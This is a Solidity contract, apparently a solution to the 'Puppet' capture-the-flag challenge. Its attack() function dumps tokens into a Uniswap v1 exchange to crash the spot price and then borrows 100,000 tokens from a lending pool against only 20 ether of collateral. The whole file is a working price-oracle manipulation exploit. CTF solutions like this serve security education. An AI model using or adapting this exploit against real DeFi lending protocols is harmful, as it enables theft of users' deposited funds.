//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IUniswapv1.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IPuppetPool {
    function borrow(uint256 amount, address recipient) external payable;
}

contract puppetAttacker {
    address public immutable puppetPool;
    address public immutable token;
    address public immutable uniswapPair;
    address private player;

    constructor(address _puppetPool, address _token, address _uniswapPair, address _player) payable {
        puppetPool = _puppetPool;
        token = _token;
        uniswapPair = _uniswapPair;
        player = _player;
    }

    function attack() external {
        IERC20(token).approve(uniswapPair, 1000 ether);
        IUniswapExchange(uniswapPair).tokenToEthSwapInput(1000 ether, 1 ether, block.timestamp + 1000);
        IPuppetPool(puppetPool).borrow{value: 20 ether}(100000 ether, player);
    }

    receive() external payable {}

}